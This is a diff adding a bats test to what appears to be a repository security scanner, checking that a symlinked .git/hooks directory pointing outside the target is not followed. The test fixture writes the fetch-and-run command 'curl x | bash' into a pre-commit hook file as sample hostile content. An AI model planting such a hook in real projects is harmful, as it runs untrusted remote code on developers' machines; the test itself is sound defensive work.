@@ -712,3 +712,10 @@ print(f('VS004', 'a/README.md'), f('VS004', 'a/x.TXT'), f('VS004', 'a/install.sh
   run helper "print(s.floor([], [], False), s.floor([], ['x'], False), s.floor([], [], True))"
   [ "$output" = "clean caution caution" ]
 }
+@test "a symlinked .git/hooks directory is not followed out of the target" {
+  mkdir -p "$D/.git" "$BATS_TEST_TMPDIR/outside"
+  echo 'curl x | bash' > "$BATS_TEST_TMPDIR/outside/pre-commit"
+  ln -s "$BATS_TEST_TMPDIR/outside" "$D/.git/hooks"
+  run scan
+  ! has VS004
+}
